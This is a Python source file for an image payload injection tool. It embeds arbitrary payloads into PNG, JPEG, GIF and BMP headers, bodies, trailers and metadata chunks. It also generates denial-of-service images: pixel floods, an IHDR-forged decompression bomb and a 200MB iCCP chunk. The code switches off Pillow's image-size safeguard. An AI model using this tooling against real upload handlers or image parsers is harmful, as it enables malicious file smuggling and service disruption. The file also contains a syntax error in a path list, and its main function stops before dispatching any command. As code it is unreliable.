#!/usr/bin/env python3
"""
Advanced Image Payload Injection Tool

A security testing tool for injecting payloads into image files with support
for multiple formats, mutation types, and comprehensive reporting.

WARNING: This tool is for authorized security testing only. Use only on systems
you own or have explicit written permission to test.

Developed By:
    - X: @CYFARELABS
    - https://cyfare.net/
    - t.me/CYFARELABS
    - https://github.com/cyfare/IXLoader

"""

import argparse
import os
import shutil
import concurrent.futures
import multiprocessing
from PIL import Image, PngImagePlugin, ExifTags, TiffImagePlugin
import io
import struct
import time
import traceback
from tqdm import tqdm
import sys
import json
import csv
import hashlib
import random
import string
import uuid
import re
import zlib
import logging
import psutil
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Callable, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
import glob

# --- Type Definitions ---
class InjectionType(Enum):
    HEADER = "header"
    BODY = "body"
    TRAILER = "trailer"
    EXIF = "exif"
    XMP = "xmp"
    IPTC = "iptc"
    ICC = "icc"
    TEXT_CHUNK = "text_chunk"

class DosType(Enum):
    PIXEL_FLOOD = "pixel_flood"
    LONG_BODY = "long_body"
    DECOMPRESSION_BOMB = "decompression_bomb"
    COLOR_PROFILE = "color_profile"
    ICCP_DOS = "iccp_dos"

@dataclass
class MutationResult:
    input_path: str
    payload_idx: int
    mutation: str
    output_path: str
    sha256: str
    size: int
    status: str
    parses: Optional[bool] = None
    error: Optional[str] = None

@dataclass
class ProcessingSummary:
    total_tasks: int
    successful_mutations: int
    failed_mutations: int
    by_format: Dict[str, Dict[str, int]]
    by_injection_type: Dict[str, Dict[str, int]]
    processing_time: float

# --- Constants ---
SUPPORTED_IMAGE_EXTENSIONS: set = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff', '.webp', '.avif', '.heic', '.ico', '.svg', '.jp2'}
DEFAULT_OUTPUT_DIR: str = 'loaded'
MUTATIONS_PER_PAYLOAD: int = 3  # header, body, trailer (legacy count)
DEFAULT_WORKERS: int = 4

# Format header sizes for correct injection points
FORMAT_HEADERS: Dict[str, int] = {
    'png': 8,      # PNG signature
    'jpg': 2,      # SOI marker
    'jpeg': 2,     # SOI marker
    'gif': 6,      # GIF87a/GIF89a
    'bmp': 2,      # BM signature
    'tiff': 4,     # II/MM + magic
    'webp': 12,    # RIFF header + WEBP
    'ico': 6,      # ICONDIR structure
}

# JPEG Markers
JPEG_MARKERS = {
    'SOI': b'\xFF\xD8',
    'EOI': b'\xFF\xD9',
    'APP0': b'\xFF\xE0',
    'APP1': b'\xFF\xE1',
    'APP13': b'\xFF\xED',
    'COM': b'\xFF\xFE',
    'SOS': b'\xFF\xDA',
}

# --- Logging Setup ---
def setup_logging(verbose: int, log_file: Optional[str] = None) -> logging.Logger:
    """Configure logging with appropriate verbosity."""
    logger = logging.getLogger('image_injector')
    logger.setLevel(logging.DEBUG if verbose >= 2 else logging.INFO if verbose >= 1 else logging.WARNING)

    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.DEBUG if verbose >= 2 else logging.INFO if verbose >= 1 else logging.WARNING)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)

    # File handler
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)

    return logger

# --- Legal Banner ---
def print_legal_banner(logger: logging.Logger, dos_mode: bool = False) -> bool:
    """Print legal warning and require acknowledgment for DoS mode."""
    banner = """
╔════════════════════════════════════════════════════════════════╗
║     AUTHORIZED SECURITY TESTING ONLY                           ║
║                                                                ║
║  This tool is designed for authorized security testing and     ║
║  research purposes only. Using this tool against systems       ║
║  without explicit written permission is illegal and unethical. ║
║                                                                ║
║  You are responsible for complying with all applicable laws    ║
║  and regulations. Misuse of this tool can result in criminal   ║
║  charges and civil liability.                                  ║
╚════════════════════════════════════════════════════════════════╝
"""
    logger.warning(banner)

    if dos_mode:
        logger.warning("⚠️  DoS mode selected. This can generate resource-intensive files.")
        return False  # Require --i-understand flag
    return True

# --- Safety Checks ---
def check_output_safety(output_dir: str, force: bool = False, logger: logging.Logger = None) -> bool:
    """Ensure output directory operation is safe."""
    if os.path.exists(output_dir):
        # Check if directory is empty
        contents = os.listdir(output_dir)
        if contents and not force:
            if logger:
                logger.error(f"Output directory '{output_dir}' is not empty. Use --force to overwrite or specify empty directory.")
            return False

        # Additional safety: prevent wiping root or current directory
        abs_path = os.path.abspath(output_dir)
        dangerous_paths = ['/', '\', '.', '..', os.path.expanduser('~'), '/home', '/root', 'C:\\', 'C:/']
        if abs_path.rstrip('/') in [p.rstrip('/') for p in dangerous_paths] or abs_path == os.path.abspath('.') and not force:
            if logger:
                logger.error(f"Refusing to operate on potentially dangerous path: '{output_dir}'. Use --force if you understand the risks.")
            return False
    return True

def check_memory_available(required_mb: int, logger: logging.Logger = None) -> bool:
    """Check if sufficient memory is available."""
    try:
        available_mb = psutil.virtual_memory().available / (1024 * 1024)
        if available_mb < required_mb:
            if logger:
                logger.warning(f"Insufficient memory: {available_mb:.0f}MB available, {required_mb}MB required")
            return False
        return True
    except Exception:
        return True  # If psutil fails, proceed with caution

# --- Payload Handling ---
class PayloadProcessor:
    """Handle payload parsing, decoding, and templating."""

    def __init__(self, format_type: str = 'text', logger: logging.Logger = None):
        self.format_type = format_type
        self.logger = logger
        self.template_vars = {
            'RAND': lambda n: ''.join(random.choices(string.ascii_letters + string.digits, k=int(n))),
            'UUID': lambda: str(uuid.uuid4()),
            'TIMESTAMP': lambda: str(int(time.time())),
        }

    def process_payload(self, payload: str, context: Dict = None) -> bytes:
        """Process payload string into bytes with templating support."""
        # Apply templating
        processed = self._apply_templates(payload, context or {})

        # Decode based on format
        if self.format_type == 'hex':
            return bytes.fromhex(processed.replace(' ', ''))
        elif self.format_type == 'base64':
            import base64
            return base64.b64decode(processed)
        elif self.format_type == 'file':
            try:
                with open(processed, 'rb') as f:
                    return f.read()
            except IOError as e:
                if self.logger:
                    self.logger.error(f"Failed to read payload file {processed}: {e}")
                return b''
        else:  # text
            return processed.encode('utf-8', errors='ignore')

    def _apply_templates(self, payload: str, context: Dict) -> str:
        """Apply template variables to payload."""
        result = payload

        # Replace {{FILE}} with context file path if available
        if '{{FILE}}' in result and 'file' in context:
            result = result.replace('{{FILE}}', context['file'])

        # Replace {{DIMS}} with image dimensions if available
        if '{{DIMS}}' in result and 'dims' in context:
            result = result.replace('{{DIMS}}', context['dims'])

        # Replace {{RAND:n}} with random string
        for match in re.finditer(r'{{RAND:(\d+)}}', result):
            n = int(match.group(1))
            replacement = self.template_vars['RAND'](n)
            result = result.replace(match.group(0), replacement, 1)

        # Replace {{UUID}}
        if '{{UUID}}' in result:
            result = result.replace('{{UUID}}', self.template_vars['UUID']())

        return result

def load_payloads(payloads_path: str, format_type: str = 'text', logger: logging.Logger = None) -> List[str]:
    """Load and return payloads from file."""
    try:
        with open(payloads_path, 'r', encoding='utf-8', errors='ignore') as f:
            if format_type == 'file':
                # For file mode, each line is a file path
                return [line.strip() for line in f if line.strip()]
            else:
                return [line.strip() for line in f if line.strip()]
    except IOError as e:
        if logger:
            logger.error(f"Failed to load payloads from {payloads_path}: {e}")
        return []

# --- CRC Calculation ---
def calculate_crc32(chunk_type: bytes, chunk_data: bytes) -> int:
    """Calculate CRC32 for PNG chunk."""
    return zlib.crc32(chunk_type + chunk_data) & 0xffffffff

def create_png_chunk(chunk_type: bytes, chunk_data: bytes) -> bytes:
    """Create a valid PNG chunk with proper CRC."""
    chunk_len = struct.pack('>I', len(chunk_data))
    chunk_crc = struct.pack('>I', calculate_crc32(chunk_type, chunk_data))
    return chunk_len + chunk_type + chunk_data + chunk_crc

# --- Format Handlers Registry ---
class FormatHandler:
    """Base class for format-specific injection handlers."""

    def __init__(self, logger: logging.Logger = None):
        self.logger = logger

    def inject_header(self, image_data: bytes, payload: bytes) -> bytes:
        raise NotImplementedError

    def inject_body(self, image_data: bytes, payload: bytes) -> bytes:
        raise NotImplementedError

    def inject_trailer(self, image_data: bytes, payload: bytes) -> bytes:
        return image_data + payload

    def inject_exif(self, image_data: bytes, payload: bytes) -> bytes:
        return image_data  # Default: not supported

    def inject_xmp(self, image_data: bytes, payload: bytes) -> bytes:
        return image_data  # Default: not supported

    def inject_text_chunk(self, image_data: bytes, payload: bytes) -> bytes:
        return image_data  # Default: not supported

class PNGHandler(FormatHandler):
    """PNG-specific injection handler with proper chunk support."""

    def inject_header(self, image_data: bytes, payload: bytes) -> bytes:
        if len(image_data) < 8:
            raise ImageProcessingError("PNG file too short for header injection")
        return image_data[:8] + payload + image_data[8:]

    def inject_body(self, image_data: bytes, payload: bytes) -> bytes:
        # Find first IDAT chunk and insert before it
        idat_pos = image_data.find(b'IDAT', 8)
        if idat_pos > 8:
            insertion_point = idat_pos - 4  # Before length field
            return image_data[:insertion_point] + payload + image_data[insertion_point:]
        # Fallback: midpoint
        mid = len(image_data) // 2
        return image_data[:mid] + payload + image_data[mid:]

    def inject_text_chunk(self, image_data: bytes, payload: bytes) -> bytes:
        # Create tEXt chunk with proper CRC
        # tEXt format: keyword (1-79 bytes) + null + text
        keyword = b'Comment'
        text_data = keyword + b'\x00' + payload[:65535]  # Limit size
        chunk = create_png_chunk(b'tEXt', text_data)

        # Insert before IDAT
        idat_pos = image_data.find(b'IDAT', 8)
        if idat_pos > 8:
            insertion_point = idat_pos - 4
            return image_data[:insertion_point] + chunk + image_data[insertion_point:]
        return self.inject_body(image_data, chunk)

    def inject_icc(self, image_data: bytes, payload: bytes) -> bytes:
        # Create iCCP chunk
        profile_name = b'ICC\x00'
        compressed = zlib.compress(payload) if payload else b'\x78\x9c'
        chunk_data = profile_name + b'\x00' + compressed
        chunk = create_png_chunk(b'iCCP', chunk_data)

        idat_pos = image_data.find(b'IDAT', 8)
        if idat_pos > 8:
            insertion_point = idat_pos - 4
            return image_data[:insertion_point] + chunk + image_data[insertion_point:]
        return self.inject_body(image_data, chunk)

class JPEGHandler(FormatHandler):
    """JPEG-specific injection handler with COM/APPn wrapper support."""

    def inject_header(self, image_data: bytes, payload: bytes) -> bytes:
        if len(image_data) < 2:
            raise ImageProcessingError("JPEG file too short for header injection")
        return image_data[:2] + payload + image_data[2:]

    def inject_body(self, image_data: bytes, payload: bytes) -> bytes:
        # Wrap payload in COM segment if not already wrapped
        if not payload.startswith(b'\xFF\xFE'):
            com_len = min(len(payload) + 2, 65535)
            payload = b'\xFF\xFE' + struct.pack('>H', com_len) + payload[:com_len-2]

        # Find SOS marker or use midpoint
        sos_pos = image_data.find(JPEG_MARKERS['SOS'])
        if sos_pos > 0:
            # Insert after SOS marker and length field
            segment_len = struct.unpack('>H', image_data[sos_pos+2:sos_pos+4])[0]
            insertion_point = sos_pos + 2 + segment_len
            return image_data[:insertion_point] + payload + image_data[insertion_point:]

        mid = len(image_data) // 2
        return image_data[:mid] + payload + image_data[mid:]

    def inject_exif(self, image_data: bytes, payload: bytes) -> bytes:
        # Create APP1 segment for EXIF
        exif_header = b'Exif\x00\x00'
        segment_data = exif_header + payload
        segment_len = len(segment_data) + 2

        if segment_len > 65535:
            segment_data = segment_data[:65533]
            segment_len = 65535

        segment = b'\xFF\xE1' + struct.pack('>H', segment_len) + segment_data
        return self.inject_header(image_data, segment)

    def inject_xmp(self, image_data: bytes, payload: bytes) -> bytes:
        # Create APP1 segment for XMP
        xmp_header = b'http://ns.adobe.com/xap/1.0/\x00'
        segment_data = xmp_header + payload
        segment_len = min(len(segment_data) + 2, 65535)

        segment = b'\xFF\xE1' + struct.pack('>H', segment_len) + segment_data[:segment_len-2]
        return self.inject_header(image_data, segment)

class GIFHandler(FormatHandler):
    """GIF-specific injection handler with extension block support."""

    def inject_header(self, image_data: bytes, payload: bytes) -> bytes:
        if len(image_data) < 6:
            raise ImageProcessingError("GIF file too short for header injection")
        return image_data[:6] + payload + image_data[6:]

    def inject_body(self, image_data: bytes, payload: bytes) -> bytes:
        # Create Comment Extension block
        # Extension Introducer (0x21) + Comment Label (0xFE) + Sub-blocks + Block Terminator (0x00)
        comment_block = b'\x21\xFE'
        # Split payload into sub-blocks (max 255 bytes each)
        pos = 0
        while pos < len(payload):
            block_size = min(255, len(payload) - pos)
            comment_block += bytes([block_size]) + payload[pos:pos+block_size]
            pos += block_size
        comment_block += b'\x00'

        # Find image separator or midpoint
        img_sep = image_data.find(b'\x2C')  # Image separator
        if img_sep > 6:
            return image_data[:img_sep] + comment_block + image_data[img_sep:]

        mid = len(image_data) // 2
        return image_data[:mid] + comment_block + image_data[mid:]

class BMPHandler(FormatHandler):
    """BMP-specific injection handler."""

    def inject_header(self, image_data: bytes, payload: bytes) -> bytes:
        if len(image_data) < 2:
            raise ImageProcessingError("BMP file too short")
        # BMP header is 14 bytes, DIB header follows
        # Insert after file header (14 bytes)
        header_size = 14
        if len(image_data) < header_size:
            return image_data[:2] + payload + image_data[2:]
        return image_data[:header_size] + payload + image_data[header_size:]

    def inject_body(self, image_data: bytes, payload: bytes) -> bytes:
        # Use reserved fields or midpoint
        mid = len(image_data) // 2
        return image_data[:mid] + payload + image_data[mid:]

# --- Handler Registry ---
HANDLERS: Dict[str, FormatHandler] = {}

def register_handler(ext: str, handler_class: type):
    """Register a format handler."""
    HANDLERS[ext.lower()] = handler_class

def get_handler(ext: str, logger: logging.Logger = None) -> FormatHandler:
    """Get appropriate handler for file extension."""
    ext = ext.lower().lstrip('.')
    handler_class = HANDLERS.get(ext, FormatHandler)
    return handler_class(logger)

# Register handlers
register_handler('png', PNGHandler)
register_handler('jpg', JPEGHandler)
register_handler('jpeg', JPEGHandler)
register_handler('gif', GIFHandler)
register_handler('bmp', BMPHandler)

# --- Error Handling ---
class ImageProcessingError(Exception):
    """Custom exception for image processing errors."""
    pass

# --- Injection Functions ---
def inject_payload(image_path: str, payload_bytes: bytes, output_path: str,
                   injection_type: str, logger: logging.Logger = None) -> MutationResult:
    """Injects payload into an image using appropriate format handler."""
    try:
        ext = os.path.splitext(image_path)[1].lower().lstrip('.')
        handler = get_handler(ext, logger)

        with open(image_path, 'rb') as f:
            image_data = f.read()

        # Select injection method
        injection_method = getattr(handler, f'inject_{injection_type}', None)
        if injection_method is None:
            injection_method = handler.inject_body  # Fallback

        new_data = injection_method(image_data, payload_bytes)

        # Write output
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, 'wb') as f:
            f.write(new_data)

        # Calculate hash and size
        sha256 = hashlib.sha256(new_data).hexdigest()
        size = len(new_data)

        return MutationResult(
            input_path=image_path,
            payload_idx=0,  # Set by caller
            mutation=injection_type,
            output_path=output_path,
            sha256=sha256,
            size=size,
            status='success'
        )

    except Exception as e:
        error_msg = f"Injection failed: {str(e)}"
        if logger:
            logger.error(error_msg)
        return MutationResult(
            input_path=image_path,
            payload_idx=0,
            mutation=injection_type,
            output_path=output_path,
            sha256='',
            size=0,
            status='failed',
            error=error_msg
        )

def validate_output(image_path: str, logger: logging.Logger = None) -> bool:
    """Validate that output image can be opened by Pillow."""
    try:
        Image.MAX_IMAGE_PIXELS = None  # Disable limit for validation
        with Image.open(image_path) as img:
            img.verify()
        return True
    except Exception as e:
        if logger:
            logger.debug(f"Validation failed for {image_path}: {e}")
        return False

# --- DoS Image Creation Functions ---
class DosImageCreator:
    """Create various DoS test images."""

    def __init__(self, logger: logging.Logger = None):
        self.logger = logger
        Image.MAX_IMAGE_PIXELS = None  # Disable safety limit

    def create_pixel_flood(self, output_path: str) -> bool:
        """Create large dimension image."""
        dims = [(10000, 10000), (5000, 5000), (2000, 2000)]

        # Check memory before attempting
        required_mb = (dims[0][0] * dims[0][1] * 3) / (1024 * 1024)
        if not check_memory_available(required_mb + 500, self.logger):
            return False

        for width, height in dims:
            try:
                if self.logger:
                    self.logger.info(f"Attempting pixel flood: {width}x{height}")
                img = Image.new('RGB', (width, height), color='white')
                img.save(output_path)
                if self.logger:
                    self.logger.info(f"Created pixel flood: {output_path}")
                return True
            except (MemoryError, ValueError) as e:
                if self.logger:
                    self.logger.warning(f"Failed pixel flood {width}x{height}: {e}")
                continue
        return False

    def create_long_body(self, output_path: str) -> bool:
        """Create image with large metadata."""
        try:
            img = Image.new('RGB', (100, 100), color='white')
            ext = os.path.splitext(output_path)[1].lower()

            if ext == '.png':
                meta = PngImagePlugin.PngInfo()
                comment_size = 100 * 1024
                num_comments = 100
                comment_len = comment_size // num_comments

                for i in range(num_comments):
                    meta.add_text(f"Comment{i}", "A" * comment_len, zip=False)
                img.save(output_path, pnginfo=meta)

            elif ext in ('.jpg', '.jpeg'):
                buffer = io.BytesIO()
                img.save(buffer, format="JPEG", quality=95)
                img_data = buffer.getvalue()

                # Create large COM segment
                com_marker = b'\xFF\xFE'
                comment_payload = b'A' * 65533
                comment_len_bytes = struct.pack('>H', len(comment_payload) + 2)

                insertion_point = 2
                new_data = img_data[:insertion_point] + com_marker + comment_len_bytes + comment_payload + img_data[insertion_point:]

                with open(output_path, 'wb') as f:
                    f.write(new_data)
            else:
                img.save(output_path)

            return True
        except Exception as e:
            if self.logger:
                self.logger.error(f"Failed long body creation: {e}")
            return False

    def create_decompression_bomb(self, output_path: str) -> bool:
        """Create PNG with mismatched declared dimensions."""
        try:
            width, height = 1, 1
            img = Image.new('RGB', (width, height), color='white')

            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            img_data = bytearray(buffer.getvalue())

            # Find IHDR
            ihdr_start = 8
            if len(img_data) < ihdr_start + 25:
                return False
            if img_data[ihdr_start+4:ihdr_start+8] != b'IHDR':
                return False

            # Modify dimensions
            declared_width, declared_height = 30000, 30000
            struct.pack_into('>II', img_data, ihdr_start + 8, declared_width, declared_height)

            # Recalculate CRC
            ihdr_data = bytes(img_data[ihdr_start+8:ihdr_start+8+13])
            new_crc = calculate_crc32(b'IHDR', ihdr_data)
            struct.pack_into('>I', img_data, ihdr_start + 8 + 13, new_crc)

            with open(output_path, 'wb') as f:
                f.write(img_data)
            return True
        except Exception as e:
            if self.logger:
                self.logger.error(f"Failed decompression bomb: {e}")
            return False

    def create_iccp_dos(self, output_path: str) -> bool:
        """Create PNG with large iCCP chunk."""
        try:
            # Check memory
            if not check_memory_available(250, self.logger):
                return False

            img = Image.new('RGB', (100, 100), color='white')
            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            img_data = buffer.getvalue()

            # Find IDAT
            idat_pos = img_data.find(b'IDAT')
            if idat_pos == -1:
                return False
            insertion_point = idat_pos - 4

            # Create iCCP chunk with proper CRC
            profile_name = b'LargeProfile\x00'
            compression_method = b'\x00'
            # Large but compressible data
            large_data = b'\x00' * (200 * 1024 * 1024)  # 200MB of zeros
            compressed = zlib.compress(large_data, level=9)

            chunk_data = profile_name + compression_method + compressed
            chunk = create_png_chunk(b'iCCP', chunk_data)

            new_data = img_data[:insertion_point] + chunk + img_data[insertion_point:]

            with open(output_path, 'wb') as f:
                f.write(new_data)
            return True
        except Exception as e:
            if self.logger:
                self.logger.error(f"Failed iCCP DoS: {e}")
            return False

# --- Worker and Task Management ---
def get_optimal_workers(preferred: Optional[str] = None) -> int:
    """Determine optimal worker count based on workload type."""
    cpu_cores = os.cpu_count() or DEFAULT_WORKERS

    if preferred == 'process':
        return max(1, cpu_cores)
    elif preferred == 'thread':
        return max(1, cpu_cores * 2)
    else:
        # Auto: use processes for CPU-bound work
        return max(1, min(32, cpu_cores * 2))

def collect_input_files(input_path: str, pattern: str = '*',
                       recursive: bool = False,
                       logger: logging.Logger = None) -> List[str]:
    """Collect input files with glob and recursive support."""
    files = []

    if os.path.isfile(input_path):
        if any(input_path.lower().endswith(ext) for ext in SUPPORTED_IMAGE_EXTENSIONS):
            files.append(input_path)
    elif os.path.isdir(input_path):
        if recursive:
            for root, _, filenames in os.walk(input_path):
                for filename in filenames:
                    if any(filename.lower().endswith(ext) for ext in SUPPORTED_IMAGE_EXTENSIONS):
                        files.append(os.path.join(root, filename))
        else:
            glob_pattern = os.path.join(input_path, pattern)
            for filepath in glob.glob(glob_pattern):
                if os.path.isfile(filepath) and any(filepath.lower().endswith(ext) for ext in SUPPORTED_IMAGE_EXTENSIONS):
                    files.append(filepath)

    if logger:
        logger.info(f"Collected {len(files)} input files")
    return files

def generate_safe_filename(base_name: str, ext: str, payload_idx: int,
                           mutation: str, output_dir: str,
                           existing: set = None) -> str:
    """Generate safe, unique filename."""
    # Preserve original name better
    safe_base = re.sub(r'[^\w\-\.]', '_', base_name)

    # Add hash suffix to prevent collisions
    unique_str = f"{safe_base}_{payload_idx}_{mutation}"
    hash_suffix = hashlib.md5(unique_str.encode()).hexdigest()[:8]

    filename = f"{safe_base}_p{payload_idx}_m{mutation}_{hash_suffix}{ext}"
    output_path = os.path.join(output_dir, filename)

    # Handle collisions with counter
    if existing and output_path in existing:
        counter = 1
        while output_path in existing:
            filename = f"{safe_base}_p{payload_idx}_m{mutation}_{hash_suffix}_{counter}{ext}"
            output_path = os.path.join(output_dir, filename)
            counter += 1

    return output_path

# --- Task Processing ---
def process_task(task: Tuple, args, logger: logging.Logger) -> List[MutationResult]:
    """Process a single image-payload task."""
    img_path, payload_str, payload_idx, payload_processor = task

    results = []
    ext = os.path.splitext(img_path)[1].lower()
    base_name = os.path.splitext(os.path.basename(img_path))[0]

    # Process payload with templating
    context = {'file': img_path}
    try:
        with Image.open(img_path) as img:
            context['dims'] = f"{img.width}x{img.height}"
    except:
        pass

    payload_bytes = payload_processor.process_payload(payload_str, context)

    # Determine which mutations to apply
    mutations = []
    if 'header' in args.mutations:
        mutations.append('header')
    if 'body' in args.mutations:
        mutations.append('body')
    if 'trailer' in args.mutations:
        mutations.append('trailer')
    if 'exif' in args.mutations and ext in ('.jpg', '.jpeg', '.tiff'):
        mutations.append('exif')
    if 'xmp' in args.mutations and ext in ('.jpg', '.jpeg'):
        mutations.append('xmp')
    if 'text_chunk' in args.mutations and ext == '.png':
        mutations.append('text_chunk')

    for mutation in mutations:
        output_path = generate_safe_filename(
            base_name, ext, payload_idx, mutation, args.output
        )

        # Skip if resuming and file exists
        if args.resume and os.path.exists(output_path):
            logger.debug(f"Skipping existing file: {output_path}")
            continue

        result = inject_payload(img_path, payload_bytes, output_path, mutation, logger)
        result.payload_idx = payload_idx

        # Validate if requested
        if args.validate and result.status == 'success':
            result.parses = validate_output(output_path, logger)

        results.append(result)

    return results

# --- Reporting ---
def save_manifest(results: List[MutationResult], output_dir: str,
                  format_type: str = 'json', logger: logging.Logger = None):
    """Save results manifest in specified format."""
    manifest_path = os.path.join(output_dir, f'manifest.{format_type}')

    if format_type == 'json':
        data = [asdict(r) for r in results]
        with open(manifest_path, 'w') as f:
            json.dump(data, f, indent=2)
    elif format_type == 'csv':
        if results:
            with open(manifest_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=asdict(results[0]).keys())
                writer.writeheader()
                for r in results:
                    writer.writerow(asdict(r))

    if logger:
        logger.info(f"Manifest saved to {manifest_path}")

def print_summary(summary: ProcessingSummary, logger: logging.Logger):
    """Print formatted summary."""
    print("\n" + "="*70)
    print("PROCESSING SUMMARY")
    print("-"*70)
    print(f"Total tasks:           {summary.total_tasks}")
    print(f"Successful mutations:  {summary.successful_mutations}")
    print(f"Failed mutations:      {summary.failed_mutations}")
    print(f"Processing time:       {summary.processing_time:.2f}s")
    print("-"*70)
    print("By format:")
    for fmt, stats in summary.by_format.items():
        print(f"  {fmt:10s}: {stats.get('success', 0)} success, {stats.get('fail', 0)} fail")
    print("-"*70)
    print("By injection type:")
    for inj_type, stats in summary.by_injection_type.items():
        print(f"  {inj_type:12s}: {stats.get('success', 0)} success, {stats.get('fail', 0)} fail")
    print("="*70)

# --- Command Implementations ---
def cmd_inject(args, logger: logging.Logger) -> int:
    """Execute payload injection command."""
    start_time = time.time()

    # Load payloads
    if not args.payloads:
        logger.error("Payload file required for injection mode")
        return 1

    payloads = load_payloads(args.payloads, args.payload_format, logger)
    if not payloads:
        logger.error("No payloads loaded")
        return 1

    logger.info(f"Loaded {len(payloads)} payloads")

    # Collect input files
    image_paths = collect_input_files(args.input, args.pattern, args.recursive, logger)
    if not image_paths:
        logger.error("No input files found")
        return 1

    # Setup payload processor
    payload_processor = PayloadProcessor(args.payload_format, logger)

    # Prepare tasks
    tasks = []
    for img_path in image_paths:
        for i, payload in enumerate(payloads):
            tasks.append((img_path, payload, i+1, payload_processor))

    logger.info(f"Prepared {len(tasks)} tasks")

    # Setup executor
    workers = get_optimal_workers(args.executor)
    logger.info(f"Using {workers} workers ({args.executor or 'auto'})")

    all_results = []

    # Process tasks
    executor_class = concurrent.futures.ProcessPoolExecutor if args.executor == 'process' else concurrent.futures.ThreadPoolExecutor

    with tqdm(total=len(tasks), desc="Processing", disable=args.verbose >= 2) as pbar:
        with executor_class(max_workers=workers) as executor:
            futures = {executor.submit(process_task, task, args, logger): task for task in tasks}

            for future in concurrent.futures.as_completed(futures):
                try:
                    results = future.result()
                    all_results.extend(results)
                except Exception as e:
                    logger.error(f"Task failed: {e}")
                pbar.update(1)

    # Calculate summary
    summary = ProcessingSummary(
        total_tasks=len(tasks),
        successful_mutations=sum(1 for r in all_results if r.status == 'success'),
        failed_mutations=sum(1 for r in all_results if r.status == 'failed'),
        by_format={},
        by_injection_type={},
        processing_time=time.time() - start_time
    )

    # Aggregate stats
    for r in all_results:
        ext = os.path.splitext(r.input_path)[1].lower()
        if ext not in summary.by_format:
            summary.by_format[ext] = {'success': 0, 'fail': 0}
        summary.by_format[ext][r.status] = summary.by_format[ext].get(r.status, 0) + 1

        if r.mutation not in summary.by_injection_type:
            summary.by_injection_type[r.mutation] = {'success': 0, 'fail': 0}
        summary.by_injection_type[r.mutation][r.status] = summary.by_injection_type[r.mutation].get(r.status, 0) + 1

    # Save manifest
    if args.manifest:
        save_manifest(all_results, args.output, args.manifest_format, logger)

    print_summary(summary, logger)
    return 0 if summary.failed_mutations == 0 else 1

def cmd_dos(args, logger: logging.Logger) -> int:
    """Execute DoS image creation command."""
    start_time = time.time()

    if not args.i_understand:
        logger.error("DoS mode requires --i-understand flag to acknowledge risks")
        return 1

    creator = DosImageCreator(logger)

    dos_tasks = []
    if 'pixel_flood' in args.dos_types:
        dos_tasks.append(("Pixel Flood", creator.create_pixel_flood,
                         os.path.join(args.output, "dos_pixel_flood.png")))
    if 'long_body' in args.dos_types:
        dos_tasks.extend([
            ("Long Body PNG", creator.create_long_body, os.path.join(args.output, "dos_long_body.png")),
            ("Long Body JPG", creator.create_long_body, os.path.join(args.output, "dos_long_body.jpg"))
        ])
    if 'decompression_bomb' in args.dos_types:
        dos_tasks.append(("Decompression Bomb", creator.create_decompression_bomb,
                         os.path.join(args.output, "dos_decompression.png")))
    if 'iccp_dos' in args.dos_types or 'color_profile' in args.dos_types:
        dos_tasks.append(("iCCP DoS", creator.create_iccp_dos,
                         os.path.join(args.output, "dos_iccp.png")))

    successful = 0
    failed = 0

    with tqdm(total=len(dos_tasks), desc="Creating DoS images") as pbar:
        for name, func, path in dos_tasks:
            if args.resume and os.path.exists(path):
                logger.info(f"Skipping existing: {path}")
                successful += 1
                pbar.update(1)
                continue

            logger.info(f"Creating {name}...")
            if func(path):
                successful += 1
            else:
                failed += 1
            pbar.update(1)

    print(f"\nDoS Creation Complete: {successful} successful, {failed} failed")
    print(f"Time: {time.time() - start_time:.2f}s")

    return 0 if failed == 0 else 1

# --- Main Entry Point ---
def main():
    parser = argparse.ArgumentParser(
        description='Advanced Image Payload Injection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Inject payloads into images
  %(prog)s inject -i ./images -p payloads.txt -o ./output

  # Create DoS test images
  %(prog)s dos --i-understand -o ./dos_images

  # Dry run with specific mutations
  %(prog)s inject -i ./images -p payloads.txt --dry-run --mutations header,trailer
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # Inject command
    inject_parser = subparsers.add_parser('inject', help='Inject payloads into images')
    inject_parser.add_argument('-i', '--input', required=True, help='Input file or directory')
    inject_parser.add_argument('-p', '--payloads', help='Payloads file')
    inject_parser.add_argument('-o', '--output', default=DEFAULT_OUTPUT_DIR, help='Output directory')
    inject_parser.add_argument('--payload-format', choices=['text', 'hex', 'base64', 'file'],
                              default='text', help='Payload encoding format')
    inject_parser.add_argument('--mutations', default='header,body,trailer',
                              help='Comma-separated mutation types')
    inject_parser.add_argument('--pattern', default='*', help='File glob pattern')
    inject_parser.add_argument('--recursive', action='store_true', help='Scan recursively')
    inject_parser.add_argument('--executor', choices=['thread', 'process'],
                              help='Executor type (default: auto)')
    inject_parser.add_argument('--dry-run', action='store_true', help='Show what would be done')
    inject_parser.add_argument('--resume', action='store_true', help='Skip existing files')
    inject_parser.add_argument('--validate', action='store_true', help='Validate output files')
    inject_parser.add_argument('--manifest', action='store_true', help='Generate manifest')
    inject_parser.add_argument('--manifest-format', choices=['json', 'csv'], default='json')
    inject_parser.add_argument('--force', action='store_true', help='Overwrite existing output')
    inject_parser.add_argument('-v', '--verbose', action='count', default=0)
    inject_parser.add_argument('--log-file', help='Log file path')
    inject_parser.add_argument('--seed', type=int, help='Random seed for reproducibility')

    # DoS command
    dos_parser = subparsers.add_parser('dos', help='Create DoS test images')
    dos_parser.add_argument('-o', '--output', default=DEFAULT_OUTPUT_DIR, help='Output directory')
    dos_parser.add_argument('--dos-types', default='pixel_flood,long_body,decompression_bomb,iccp_dos',
                           help='Comma-separated DoS types')
    dos_parser.add_argument('--i-understand', action='store_true',
                           help='Acknowledge DoS mode risks')
    dos_parser.add_argument('--resume', action='store_true')
    dos_parser.add_argument('--force', action='store_true')
    dos_parser.add_argument('-v', '--verbose', action='count', default=0)
